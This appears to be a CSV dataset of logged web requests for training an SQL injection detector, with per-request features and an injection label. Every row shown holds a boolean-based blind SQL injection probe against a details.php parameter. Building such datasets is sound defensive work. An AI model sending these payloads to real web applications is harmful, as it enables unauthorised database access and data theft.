full_url,parsed_url,hostname,event_time,sql_keyword,params_length,request_volume,special_chars,values_to_length,injection
/details.php?prod=5&type=%3F%27%29%29%29%20AND%205104%3D5104%20AND%20%28%28%28%27CWZH%27%3D%27CWZH,/details.php?prod=5&type=?'))) AND 5104=5104 AND ((('CWZH'='CWZH,192.168.43.6,1681395121.088536,1,40,97.8,1,5.0,1
/details.php?prod=5&type=%3F%27%20AND%201405%3D6623%20AND%20%27uLNg%27%3D%27uLNg,/details.php?prod=5&type=?' AND 1405=6623 AND 'uLNg'='uLNg,192.168.43.6,1681395121.092646,1,34,97.8,1,5.882352941176471,1
/details.php?prod=5&type=%3F%27%20AND%205104%3D5104%20AND%20%27oYMl%27%3D%27oYMl,/details.php?prod=5&type=?' AND 5104=5104 AND 'oYMl'='oYMl,192.168.43.6,1681395121.09645,1,34,97.8,1,5.882352941176471,1
/details.php?prod=5&type=%3F%27%29%20AND%203479%3D7998%20AND%20%28%27yyoM%27%20LIKE%20%27yyoM,/details.php?prod=5&type=?') AND 3479=7998 AND ('yyoM' LIKE 'yyoM,192.168.43.6,1681395121.100963,2,41,97.8,1,7.317073170731708,1
/details.php?prod=5&type=%3F%27%29%20AND%205104%3D5104%20AND%20%28%27Geve%27%20LIKE%20%27Geve,/details.php?prod=5&type=?') AND 5104=5104 AND ('Geve' LIKE 'Geve,192.168.43.6,1681395121.104047,2,41,97.8,1,7.317073170731708,1
/details.php?prod=5&type=%3F%27%29%29%20AND%207104%3D8936%20AND%20%28%28%27CECy%27%20LIKE%20%27CECy,/details.php?prod=5&type=?')) AND 7104=8936 AND (('CECy' LIKE 'CECy,192.168.43.6,1681395121.108701,2,43,97.8,1,6.976744186046512,1
/details.php?prod=5&type=%3F%27%29%29%20AND%205104%3D5104%20AND%20%28%28%27DEgJ%27%20LIKE%20%27DEgJ,/details.php?prod=5&type=?')) AND 5104=5104 AND (('DEgJ' LIKE 'DEgJ,192.168.43.6,1681395121.112996,2,43,97.8,1,6.976744186046512,1
/details.php?prod=5&type=%3F%27%29%29%29%20AND%209598%3D1778%20AND%20%28%28%28%27WsZx%27%20LIKE%20%27WsZx,/details.php?prod=5&type=?'))) AND 9598=1778 AND ((('WsZx' LIKE 'WsZx,192.168.43.6,1681395121.116415,2,45,97.8,1,6.666666666666667,1
/details.php?prod=5&type=%3F%27%29%29%29%20AND%205104%3D5104%20AND%20%28%28%28%27LJTI%27%20LIKE%20%27LJTI,/details.php?prod=5&type=?'))) AND 5104=5104 AND ((('LJTI' LIKE 'LJTI,192.168.43.6,1681395121.120735,2,45,97.8,1,6.666666666666667,1
/details.php?prod=5&type=%3F%25%27%20AND%203184%3D9462%20AND%20%27ZUHe%25%27%3D%27ZUHe,/details.php?prod=5&type=?%' AND 3184=9462 AND 'ZUHe%'='ZUHe,192.168.43.6,1681395121.125832,1,36,97.8,1,5.555555555555555,1
/details.php?prod=5&type=%3F%25%27%20AND%205104%3D5104%20AND%20%27BNTu%25%27%3D%27BNTu,/details.php?prod=5&type=?%' AND 5104=5104 AND 'BNTu%'='BNTu,192.168.43.6,1681395121.130822,1,36,97.8,1,5.555555555555555,1
/details.php?prod=5&type=%3F%27%20AND%203152%3D1648%20AND%20%27KQSl%27%20LIKE%20%27KQSl,/details.php?prod=5&type=?' AND 3152=1648 AND 'KQSl' LIKE 'KQSl,192.168.43.6,1681395121.135601,2,39,97.8,1,7.6923076923076925,1
/details.php?prod=5&type=%3F%27%20AND%205104%3D5104%20AND%20%27YEIt%27%20LIKE%20%27YEIt,/details.php?prod=5&type=?' AND 5104=5104 AND 'YEIt' LIKE 'YEIt,192.168.43.6,1681395121.13938,2,39,97.8,1,7.6923076923076925,1
/details.php?prod=5&type=%3F%22%29%20AND%208266%3D3927%20AND%20%28%22IxGf%22%3D%22IxGf,"/details.php?prod=5&type=?"") AND 8266=3927 AND (""IxGf""=""IxGf",192.168.43.6,1681395121.143579,1,36,97.8,1,5.555555555555555,1
/details.php?prod=5&type=%3F%22%29%20AND%205104%3D5104%20AND%20%28%22FOvm%22%3D%22FOvm,"/details.php?prod=5&type=?"") AND 5104=5104 AND (""FOvm""=""FOvm",192.168.43.6,1681395121.147383,1,36,97.8,1,5.555555555555555,1
/details.php?prod=5&type=%3F%22%29%29%20AND%205685%3D1202%20AND%20%28%28%22gqpJ%22%3D%22gqpJ,"/details.php?prod=5&type=?"")) AND 5685=1202 AND ((""gqpJ""=""gqpJ",192.168.43.6,1681395121.151095,1,38,97.8,1,5.2631578947368425,1
/details.php?prod=5&type=%3F%22%29%29%20AND%205104%3D5104%20AND%20%28%28%22Hgcq%22%3D%22Hgcq,"/details.php?prod=5&type=?"")) AND 5104=5104 AND ((""Hgcq""=""Hgcq",192.168.43.6,1681395121.156044,1,38,97.8,1,5.2631578947368425,1
/details.php?prod=5&type=%3F%22%29%29%29%20AND%202049%3D4205%20AND%20%28%28%28%22JGas%22%3D%22JGas,"/details.php?prod=5&type=?""))) AND 2049=4205 AND (((""JGas""=""JGas",192.168.43.6,1681395121.159976,1,40,97.8,1,5.0,1
/details.php?prod=5&type=%3F%22%29%29%29%20AND%205104%3D5104%20AND%20%28%28%28%22Rfka%22%3D%22Rfka,"/details.php?prod=5&type=?""))) AND 5104=5104 AND (((""Rfka""=""Rfka",192.168.43.6,1681395121.163618,1,40,97.8,1,5.0,1
/details.php?prod=5&type=%3F%22%20AND%201379%3D1933%20AND%20%22ReQj%22%3D%22ReQj,"/details.php?prod=5&type=?"" AND 1379=1933 AND ""ReQj""=""ReQj",192.168.43.6,1681395121.167495,1,34,97.8,1,5.882352941176471,1
/details.php?prod=5&type=%3F%22%20AND%205104%3D5104%20AND%20%22QTMn%22%3D%22QTMn,"/details.php?prod=5&type=?"" AND 5104=5104 AND ""QTMn""=""QTMn",192.168.43.6,1681395121.171359,1,34,97.8,1,5.882352941176471,1
/details.php?prod=5&type=%3F%22%29%20AND%207318%3D8787%20AND%20%28%22hgph%22%20LIKE%20%22hgph,"/details.php?prod=5&type=?"") AND 7318=8787 AND (""hgph"" LIKE ""hgph",192.168.43.6,1681395121.175334,2,41,97.8,1,7.317073170731708,1
/details.php?prod=5&type=%3F%22%29%20AND%205104%3D5104%20AND%20%28%22hebE%22%20LIKE%20%22hebE,"/details.php?prod=5&type=?"") AND 5104=5104 AND (""hebE"" LIKE ""hebE",192.168.43.6,1681395121.178864,2,41,97.8,1,7.317073170731708,1
/details.php?prod=5&type=%3F%22%29%29%20AND%203973%3D1649%20AND%20%28%28%22HifU%22%20LIKE%20%22HifU,"/details.php?prod=5&type=?"")) AND 3973=1649 AND ((""HifU"" LIKE ""HifU",192.168.43.6,1681395121.182828,2,43,97.8,1,6.976744186046512,1
/details.php?prod=5&type=%3F%22%29%29%20AND%205104%3D5104%20AND%20%28%28%22sIqv%22%20LIKE%20%22sIqv,"/details.php?prod=5&type=?"")) AND 5104=5104 AND ((""sIqv"" LIKE ""sIqv",192.168.43.6,1681395121.186419,2,43,97.8,1,6.976744186046512,1
/details.php?prod=5&type=%3F%22%29%29%29%20AND%205091%3D9637%20AND%20%28%28%28%22UMhb%22%20LIKE%20%22UMhb,"/details.php?prod=5&type=?""))) AND 5091=9637 AND (((""UMhb"" LIKE ""UMhb",192.168.43.6,1681395121.190602,2,45,97.8,1,6.666666666666667,1
/details.php?prod=5&type=%3F%22%29%29%29%20AND%205104%3D5104%20AND%20%28%28%28%22RLHs%22%20LIKE%20%22RLHs,"/details.php?prod=5&type=?""))) AND 5104=5104 AND (((""RLHs"" LIKE ""RLHs",192.168.43.6,1681395121.194052,2,45,97.8,1,6.666666666666667,1
/details.php?prod=5&type=%3F%22%20AND%204429%3D9146%20AND%20%22Ugga%22%20LIKE%20%22Ugga,"/details.php?prod=5&type=?"" AND 4429=9146 AND ""Ugga"" LIKE ""Ugga",192.168.43.6,1681395121.197784,2,39,97.8,1,7.6923076923076925,1
/details.php?prod=5&type=%3F%22%20AND%205104%3D5104%20AND%20%22yehE%22%20LIKE%20%22yehE,"/details.php?prod=5&type=?"" AND 5104=5104 AND ""yehE"" LIKE ""yehE",192.168.43.6,1681395121.20209,2,39,97.8,1,7.6923076923076925,1
/details.php?prod=5&type=%3F%20AND%205352%3D5563--%20eYpV,/details.php?prod=5&type=? AND 5352=5563-- eYpV,192.168.43.6,1681395121.206102,1,23,97.8,1,8.695652173913043,1
/details.php?prod=5&type=%3F%20AND%205104%3D5104--%20lWCP,/details.php?prod=5&type=? AND 5104=5104-- lWCP,192.168.43.6,1681395121.209851,1,23,97.8,1,8.695652173913043,1
/details.php?prod=5&type=%3F%20AND%202379%3D3691%23%20Wcsa,/details.php?prod=5&type=? AND 2379=3691# Wcsa,192.168.43.6,1681395121.213988,1,22,97.8,1,9.090909090909092,1
/details.php?prod=5&type=%3F%20AND%205104%3D5104%23%20CGUV,/details.php?prod=5&type=? AND 5104=5104# CGUV,192.168.43.6,1681395121.217159,1,22,97.8,1,9.090909090909092,1
/details.php?prod=5&type=%3F%27%20AND%207998%3D9634%20OR%20%27PWuu%27%3D%27sndq,/details.php?prod=5&type=?' AND 7998=9634 OR 'PWuu'='sndq,192.168.43.6,1681395121.269364,2,33,97.8,1,9.090909090909092,1
/details.php?prod=5&type=%3F%27%20AND%205104%3D5104%20OR%20%27dpWP%27%3D%27izAN,/details.php?prod=5&type=?' AND 5104=5104 OR 'dpWP'='izAN,192.168.43.6,1681395121.273702,2,33,97.8,1,9.090909090909092,1
/details.php?prod=5&type=%3F%27%29%20WHERE%203161%3D3161%20AND%207815%3D5706--%20cJAi,/details.php?prod=5&type=?') WHERE 3161=3161 AND 7815=5706-- cJAi,192.168.43.6,1681395121.277873,2,41,97.8,2,9.75609756097561,1
/details.php?prod=5&type=%3F%27%29%20WHERE%202507%3D2507%20AND%205104%3D5104--%20FTPP,/details.php?prod=5&type=?') WHERE 2507=2507 AND 5104=5104-- FTPP,192.168.43.6,1681395121.281326,2,41,97.8,2,9.75609756097561,1
/details.php?prod=5&type=%3F%22%29%20WHERE%205934%3D5934%20AND%203984%3D7102--%20hldD,"/details.php?prod=5&type=?"") WHERE 5934=5934 AND 3984=7102-- hldD",192.168.43.6,1681395121.285965,2,41,97.8,2,9.75609756097561,1
/details.php?prod=5&type=%3F%22%29%20WHERE%203038%3D3038%20AND%205104%3D5104--%20pxYc,"/details.php?prod=5&type=?"") WHERE 3038=3038 AND 5104=5104-- pxYc",192.168.43.6,1681395121.290045,2,41,97.8,2,9.75609756097561,1
/details.php?prod=5&type=%3F%29%20WHERE%201102%3D1102%20AND%208755%3D4347--%20lvBc,/details.php?prod=5&type=?) WHERE 1102=1102 AND 8755=4347-- lvBc,192.168.43.6,1681395121.294103,2,40,97.8,1,7.5,1
/details.php?prod=5&type=%3F%29%20WHERE%209593%3D9593%20AND%205104%3D5104--%20WzuW,/details.php?prod=5&type=?) WHERE 9593=9593 AND 5104=5104-- WzuW,192.168.43.6,1681395121.297695,2,40,97.8,1,7.5,1
/details.php?prod=5&type=%3F%27%20WHERE%201691%3D1691%20AND%207491%3D9341--%20aOYW,/details.php?prod=5&type=?' WHERE 1691=1691 AND 7491=9341-- aOYW,192.168.43.6,1681395121.304845,2,40,97.8,2,10.0,1
/details.php?prod=5&type=%3F%27%20WHERE%206335%3D6335%20AND%205104%3D5104--%20NKcY,/details.php?prod=5&type=?' WHERE 6335=6335 AND 5104=5104-- NKcY,192.168.43.6,1681395121.308656,2,40,97.8,2,10.0,1
/details.php?prod=5&type=%3F%22%20WHERE%207470%3D7470%20AND%204060%3D6675--%20LQTA,"/details.php?prod=5&type=?"" WHERE 7470=7470 AND 4060=6675-- LQTA",192.168.43.6,1681395121.313062,2,40,97.8,2,10.0,1
/details.php?prod=5&type=%3F%22%20WHERE%203159%3D3159%20AND%205104%3D5104--%20esQu,"/details.php?prod=5&type=?"" WHERE 3159=3159 AND 5104=5104-- esQu",192.168.43.6,1681395121.316859,2,40,97.8,2,10.0,1
/details.php?prod=5&type=%3F%20WHERE%207451%3D7451%20AND%202466%3D6867--%20KcXs,/details.php?prod=5&type=? WHERE 7451=7451 AND 2466=6867-- KcXs,192.168.43.6,1681395121.321197,2,39,97.8,1,7.6923076923076925,1
/details.php?prod=5&type=%3F%20WHERE%201872%3D1872%20AND%205104%3D5104--%20jiwZ,/details.php?prod=5&type=? WHERE 1872=1872 AND 5104=5104-- jiwZ,192.168.43.6,1681395121.324701,2,39,97.8,1,7.6923076923076925,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x4b7a4851%20WHERE%201422%3D1422%20AND%203534%3D6852%29%7C%7C%27,/details.php?prod=5&type=?'||(SELECT 0x4b7a4851 WHERE 1422=1422 AND 3534=6852)||',192.168.43.6,1681395121.330245,3,57,97.8,1,7.017543859649122,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x63524349%20WHERE%209901%3D9901%20AND%205104%3D5104%29%7C%7C%27,/details.php?prod=5&type=?'||(SELECT 0x63524349 WHERE 9901=9901 AND 5104=5104)||',192.168.43.6,1681395121.334302,3,57,97.8,1,7.017543859649122,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x6f676e59%20FROM%20DUAL%20WHERE%202039%3D2039%20AND%206839%3D8740%29%7C%7C%27,/details.php?prod=5&type=?'||(SELECT 0x6f676e59 FROM DUAL WHERE 2039=2039 AND 6839=8740)||',192.168.43.6,1681395121.33777,4,67,97.8,1,7.462686567164179,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x6d5a4c6f%20FROM%20DUAL%20WHERE%202751%3D2751%20AND%205104%3D5104%29%7C%7C%27,/details.php?prod=5&type=?'||(SELECT 0x6d5a4c6f FROM DUAL WHERE 2751=2751 AND 5104=5104)||',192.168.43.6,1681395121.341457,4,67,97.8,1,7.462686567164179,1
/details.php?prod=5&type=%3F%27%2B%28SELECT%200x7a486b43%20WHERE%208226%3D8226%20AND%205863%3D4891%29%2B%27,/details.php?prod=5&type=?'+(SELECT 0x7a486b43 WHERE 8226=8226 AND 5863=4891)+',192.168.43.6,1681395121.345416,3,55,97.8,1,7.2727272727272725,1
/details.php?prod=5&type=%3F%27%2B%28SELECT%200x6a7a464e%20WHERE%209157%3D9157%20AND%205104%3D5104%29%2B%27,/details.php?prod=5&type=?'+(SELECT 0x6a7a464e WHERE 9157=9157 AND 5104=5104)+',192.168.43.6,1681395121.348494,3,55,97.8,1,7.2727272727272725,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x536f4943%20FROM%20DUAL%20WHERE%209370%3D9370%20AND%206606%3D6884%29%7C%7C,/details.php?prod=5&type=?||(SELECT 0x536f4943 FROM DUAL WHERE 9370=9370 AND 6606=6884)||,192.168.43.6,1681395121.353168,4,65,97.8,0,6.153846153846154,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x715a537a%20FROM%20DUAL%20WHERE%207407%3D7407%20AND%205104%3D5104%29%7C%7C,/details.php?prod=5&type=?||(SELECT 0x715a537a FROM DUAL WHERE 7407=7407 AND 5104=5104)||,192.168.43.6,1681395121.356607,4,65,97.8,0,6.153846153846154,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x6c546473%20WHERE%201569%3D1569%20AND%201177%3D2009%29%7C%7C,/details.php?prod=5&type=?||(SELECT 0x6c546473 WHERE 1569=1569 AND 1177=2009)||,192.168.43.6,1681395121.360115,3,55,97.8,0,5.454545454545454,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x514f6455%20WHERE%202012%3D2012%20AND%205104%3D5104%29%7C%7C,/details.php?prod=5&type=?||(SELECT 0x514f6455 WHERE 2012=2012 AND 5104=5104)||,192.168.43.6,1681395121.363679,3,55,97.8,0,5.454545454545454,1
/details.php?prod=5&type=%3F%2B%28SELECT%20HJzw%20WHERE%203523%3D3523%20AND%209163%3D4482%29%2B,/details.php?prod=5&type=?+(SELECT HJzw WHERE 3523=3523 AND 9163=4482)+,192.168.43.6,1681395121.367831,3,47,97.8,0,6.382978723404255,1
/details.php?prod=5&type=%3F%2B%28SELECT%20BVzU%20WHERE%209465%3D9465%20AND%205104%3D5104%29%2B,/details.php?prod=5&type=?+(SELECT BVzU WHERE 9465=9465 AND 5104=5104)+,192.168.43.6,1681395121.371312,3,47,97.8,0,6.382978723404255,1
/details.php?prod=5&type=%3F%2B%28SELECT%200x50685463%20WHERE%201608%3D1608%20AND%204052%3D4798%29%2B,/details.php?prod=5&type=?+(SELECT 0x50685463 WHERE 1608=1608 AND 4052=4798)+,192.168.43.6,1681395121.375621,3,53,97.8,0,5.660377358490566,1
/details.php?prod=5&type=%3F%2B%28SELECT%200x49585679%20WHERE%203729%3D3729%20AND%205104%3D5104%29%2B,/details.php?prod=5&type=?+(SELECT 0x49585679 WHERE 3729=3729 AND 5104=5104)+,192.168.43.6,1681395121.379432,3,53,97.8,0,5.660377358490566,1
/details.php?prod=5&type=%3F%27%29%29%20AS%20BHIL%20WHERE%209663%3D9663%20AND%205321%3D6197--%20yxPD,/details.php?prod=5&type=?')) AS BHIL WHERE 9663=9663 AND 5321=6197-- yxPD,192.168.43.6,1681395121.383002,3,50,97.8,2,10.0,1
/details.php?prod=5&type=%3F%27%29%29%20AS%20TbLd%20WHERE%208702%3D8702%20AND%205104%3D5104--%20Mlds,/details.php?prod=5&type=?')) AS TbLd WHERE 8702=8702 AND 5104=5104-- Mlds,192.168.43.6,1681395121.386837,3,50,97.8,2,10.0,1
/details.php?prod=5&type=%3F%22%29%29%20AS%20fJaz%20WHERE%209696%3D9696%20AND%209662%3D5358--%20FzTh,"/details.php?prod=5&type=?"")) AS fJaz WHERE 9696=9696 AND 9662=5358-- FzTh",192.168.43.6,1681395121.39105,3,50,97.8,2,10.0,1
/details.php?prod=5&type=%3F%22%29%29%20AS%20fWxJ%20WHERE%206980%3D6980%20AND%205104%3D5104--%20QdLy,"/details.php?prod=5&type=?"")) AS fWxJ WHERE 6980=6980 AND 5104=5104-- QdLy",192.168.43.6,1681395121.394441,3,50,97.8,2,10.0,1
/details.php?prod=5&type=%3F%29%29%20AS%20dbyL%20WHERE%208299%3D8299%20AND%209077%3D3500--%20RQRE,/details.php?prod=5&type=?)) AS dbyL WHERE 8299=8299 AND 9077=3500-- RQRE,192.168.43.6,1681395121.402602,3,49,97.8,1,8.16326530612245,1
/details.php?prod=5&type=%3F%29%29%20AS%20NNVl%20WHERE%205965%3D5965%20AND%205104%3D5104--%20UMjn,/details.php?prod=5&type=?)) AS NNVl WHERE 5965=5965 AND 5104=5104-- UMjn,192.168.43.6,1681395121.406532,3,49,97.8,1,8.16326530612245,1
/details.php?prod=5&type=%3F%27%29%20AS%20WGMi%20WHERE%206468%3D6468%20AND%201469%3D2100--%20ISMk,/details.php?prod=5&type=?') AS WGMi WHERE 6468=6468 AND 1469=2100-- ISMk,192.168.43.6,1681395121.411107,3,49,97.8,2,10.204081632653061,1
/details.php?prod=5&type=%3F%27%29%20AS%20hMin%20WHERE%207773%3D7773%20AND%205104%3D5104--%20vWaR,/details.php?prod=5&type=?') AS hMin WHERE 7773=7773 AND 5104=5104-- vWaR,192.168.43.6,1681395121.414589,3,49,97.8,2,10.204081632653061,1
/details.php?prod=5&type=%3F%22%29%20AS%20etoU%20WHERE%209958%3D9958%20AND%204722%3D5999--%20iJdA,"/details.php?prod=5&type=?"") AS etoU WHERE 9958=9958 AND 4722=5999-- iJdA",192.168.43.6,1681395121.418612,3,49,97.8,2,10.204081632653061,1
/details.php?prod=5&type=%3F%22%29%20AS%20fTRH%20WHERE%205136%3D5136%20AND%205104%3D5104--%20BCnO,"/details.php?prod=5&type=?"") AS fTRH WHERE 5136=5136 AND 5104=5104-- BCnO",192.168.43.6,1681395121.422277,3,49,97.8,2,10.204081632653061,1
/details.php?prod=5&type=%3F%29%20AS%20asNZ%20WHERE%206734%3D6734%20AND%209865%3D3360--%20MRlX,/details.php?prod=5&type=?) AS asNZ WHERE 6734=6734 AND 9865=3360-- MRlX,192.168.43.6,1681395121.425902,3,48,97.8,1,8.333333333333334,1
/details.php?prod=5&type=%3F%29%20AS%20HWLH%20WHERE%202075%3D2075%20AND%205104%3D5104--%20RvXm,/details.php?prod=5&type=?) AS HWLH WHERE 2075=2075 AND 5104=5104-- RvXm,192.168.43.6,1681395121.429489,3,48,97.8,1,8.333333333333334,1
/details.php?prod=5&type=%3F%60%20WHERE%205111%3D5111%20AND%202540%3D2072--%20Elxl,/details.php?prod=5&type=?` WHERE 5111=5111 AND 2540=2072-- Elxl,192.168.43.6,1681395121.433579,2,40,97.8,1,7.5,1
/details.php?prod=5&type=%3F%60%20WHERE%204641%3D4641%20AND%205104%3D5104--%20CWYW,/details.php?prod=5&type=?` WHERE 4641=4641 AND 5104=5104-- CWYW,192.168.43.6,1681395121.436753,2,40,97.8,1,7.5,1
/details.php?prod=5&type=%3F%60%29%20WHERE%202426%3D2426%20AND%208080%3D9689--%20WKOB,/details.php?prod=5&type=?`) WHERE 2426=2426 AND 8080=9689-- WKOB,192.168.43.6,1681395121.441306,2,41,97.8,1,7.317073170731708,1
/details.php?prod=5&type=%3F%60%29%20WHERE%202361%3D2361%20AND%205104%3D5104--%20uCnl,/details.php?prod=5&type=?`) WHERE 2361=2361 AND 5104=5104-- uCnl,192.168.43.6,1681395121.44502,2,41,97.8,1,7.317073170731708,1
/details.php?prod=5&type=%3F%60%3D%60%3F%60%20AND%204283%3D3248%20AND%20%60%3F%60%3D%60%3F,/details.php?prod=5&type=?`=`?` AND 4283=3248 AND `?`=`?,192.168.43.6,1681395121.448284,1,32,97.8,0,3.125,1
/details.php?prod=5&type=%3F%60%3D%60%3F%60%20AND%205104%3D5104%20AND%20%60%3F%60%3D%60%3F,/details.php?prod=5&type=?`=`?` AND 5104=5104 AND `?`=`?,192.168.43.6,1681395121.452249,1,32,97.8,0,3.125,1
/details.php?prod=5&type=%3F%22%3D%22%3F%22%20AND%203391%3D5434%20AND%20%22%3F%22%3D%22%3F,"/details.php?prod=5&type=?""=""?"" AND 3391=5434 AND ""?""=""?",192.168.43.6,1681395121.456115,1,32,97.8,1,6.25,1
/details.php?prod=5&type=%3F%22%3D%22%3F%22%20AND%205104%3D5104%20AND%20%22%3F%22%3D%22%3F,"/details.php?prod=5&type=?""=""?"" AND 5104=5104 AND ""?""=""?",192.168.43.6,1681395121.459335,1,32,97.8,1,6.25,1
/details.php?prod=5&type=%3F%5D-%28SELECT%200%20WHERE%209745%3D9745%20AND%204301%3D3953%29%7C%5B%3F,/details.php?prod=5&type=?]-(SELECT 0 WHERE 9745=9745 AND 4301=3953)|[?,192.168.43.6,1681395121.463251,3,47,97.8,0,6.382978723404255,1
/details.php?prod=5&type=%3F%5D-%28SELECT%200%20WHERE%206121%3D6121%20AND%205104%3D5104%29%7C%5B%3F,/details.php?prod=5&type=?]-(SELECT 0 WHERE 6121=6121 AND 5104=5104)|[?,192.168.43.6,1681395121.467568,3,47,97.8,0,6.382978723404255,1
/details.php?prod=5&type=%3F%27%20IN%20BOOLEAN%20MODE%29%20AND%205636%3D2622%23,/details.php?prod=5&type=?' IN BOOLEAN MODE) AND 5636=2622#,192.168.43.6,1681395121.471313,2,35,97.8,2,11.428571428571429,1
/details.php?prod=5&type=%3F%27%20IN%20BOOLEAN%20MODE%29%20AND%205104%3D5104%23,/details.php?prod=5&type=?' IN BOOLEAN MODE) AND 5104=5104#,192.168.43.6,1681395121.474963,2,35,97.8,2,11.428571428571429,1
/details.php?prod=5&type=-2361,/details.php?prod=5&type=-2361,192.168.43.6,1681395121.479117,0,6,97.8,0,0.0,1
/details.php?prod=5&type=-5227%29%20OR%209681%3D4817--%20OvUw,/details.php?prod=5&type=-5227) OR 9681=4817-- OvUw,192.168.43.6,1681395121.483034,1,27,97.8,1,7.407407407407407,1
/details.php?prod=5&type=-4097%29%20OR%206404%3D6404--%20Nsvh,/details.php?prod=5&type=-4097) OR 6404=6404-- Nsvh,192.168.43.6,1681395121.486485,1,27,97.8,1,7.407407407407407,1
/details.php?prod=5&type=-7182%27%29%20OR%209484%3D3239--%20oOOo,/details.php?prod=5&type=-7182') OR 9484=3239-- oOOo,192.168.43.6,1681395121.49126,1,28,97.8,2,10.714285714285714,1
/details.php?prod=5&type=-9822%27%29%20OR%206404%3D6404--%20xEIt,/details.php?prod=5&type=-9822') OR 6404=6404-- xEIt,192.168.43.6,1681395121.495008,1,28,97.8,2,10.714285714285714,1
/details.php?prod=5&type=-7581%27%20OR%205856%3D5769--%20xCfK,/details.php?prod=5&type=-7581' OR 5856=5769-- xCfK,192.168.43.6,1681395121.504123,1,27,97.8,2,11.11111111111111,1
/details.php?prod=5&type=-3478%27%20OR%206404%3D6404--%20kpBz,/details.php?prod=5&type=-3478' OR 6404=6404-- kpBz,192.168.43.6,1681395121.507809,1,27,97.8,2,11.11111111111111,1
/details.php?prod=5&type=-2435%22%20OR%206647%3D5759--%20fcVE,"/details.php?prod=5&type=-2435"" OR 6647=5759-- fcVE",192.168.43.6,1681395121.512852,1,27,97.8,2,11.11111111111111,1
/details.php?prod=5&type=-9112%22%20OR%206404%3D6404--%20vTdo,"/details.php?prod=5&type=-9112"" OR 6404=6404-- vTdo",192.168.43.6,1681395121.516475,1,27,97.8,2,11.11111111111111,1
/details.php?prod=5&type=-6088%29%20OR%201273%3D7287%20AND%20%283757%3D3757,/details.php?prod=5&type=-6088) OR 1273=7287 AND (3757=3757,192.168.43.6,1681395121.523051,2,35,97.8,0,5.714285714285714,1
/details.php?prod=5&type=-3101%29%20OR%206404%3D6404%20AND%20%286233%3D6233,/details.php?prod=5&type=-3101) OR 6404=6404 AND (6233=6233,192.168.43.6,1681395121.577907,2,35,97.8,0,5.714285714285714,1
/details.php?prod=5&type=-5442%29%29%20OR%209411%3D7773%20AND%20%28%281988%3D1988,/details.php?prod=5&type=-5442)) OR 9411=7773 AND ((1988=1988,192.168.43.6,1681395121.584382,2,37,97.8,0,5.405405405405405,1
/details.php?prod=5&type=-8840%29%29%20OR%206404%3D6404%20AND%20%28%288504%3D8504,/details.php?prod=5&type=-8840)) OR 6404=6404 AND ((8504=8504,192.168.43.6,1681395121.589905,2,37,97.8,0,5.405405405405405,1
/details.php?prod=5&type=-1765%29%29%29%20OR%205559%3D7909%20AND%20%28%28%282211%3D2211,/details.php?prod=5&type=-1765))) OR 5559=7909 AND (((2211=2211,192.168.43.6,1681395121.596579,2,39,97.8,0,5.128205128205129,1
/details.php?prod=5&type=-3069%29%29%29%20OR%206404%3D6404%20AND%20%28%28%283104%3D3104,/details.php?prod=5&type=-3069))) OR 6404=6404 AND (((3104=3104,192.168.43.6,1681395121.645581,2,39,97.8,0,5.128205128205129,1
/details.php?prod=5&type=-3466%20OR%201023%3D9419,/details.php?prod=5&type=-3466 OR 1023=9419,192.168.43.6,1681395121.651951,1,19,97.8,0,5.2631578947368425,1
/details.php?prod=5&type=-7300%20OR%206404%3D6404,/details.php?prod=5&type=-7300 OR 6404=6404,192.168.43.6,1681395121.656067,1,19,97.8,0,5.2631578947368425,1
/details.php?prod=5&type=-7433%27%29%20OR%201547%3D3972%20AND%20%28%27ZETi%27%3D%27ZETi,/details.php?prod=5&type=-7433') OR 1547=3972 AND ('ZETi'='ZETi,192.168.43.6,1681395121.716452,2,39,97.8,1,7.6923076923076925,1
/details.php?prod=5&type=-3845%27%29%20OR%206404%3D6404%20AND%20%28%27CvWq%27%3D%27CvWq,/details.php?prod=5&type=-3845') OR 6404=6404 AND ('CvWq'='CvWq,192.168.43.6,1681395121.720593,2,39,97.8,1,7.6923076923076925,1
